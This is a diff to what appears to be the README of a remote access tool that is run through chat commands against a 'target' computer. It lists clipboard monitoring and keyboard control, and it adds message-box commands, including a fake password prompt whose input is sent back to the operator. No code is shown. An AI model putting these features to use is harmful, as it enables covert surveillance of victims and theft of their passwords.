@@ -28,6 +28,13 @@ THe clipboard monitor URL mode acts the same way as the normal monitor mode as i
 !clipboard monior url stop = Stops the Clipboard Monitor URL mode 
 !clipboard monitor url status = See the status of the Clipboard Monitor URL mode
 
+### Message commands
+Different ways to deliver a messag box to the user
+
+!message title message = Shows a generic message box on the targets computer
+!message prompt title message = Shows a message box with a text input for the target to enter text which will be sent to you
+!message password title message = Same as message prompt but with a password input field
+
 ### Keyboard commands:
 
 !keyboard write = Use the keyboard to write  
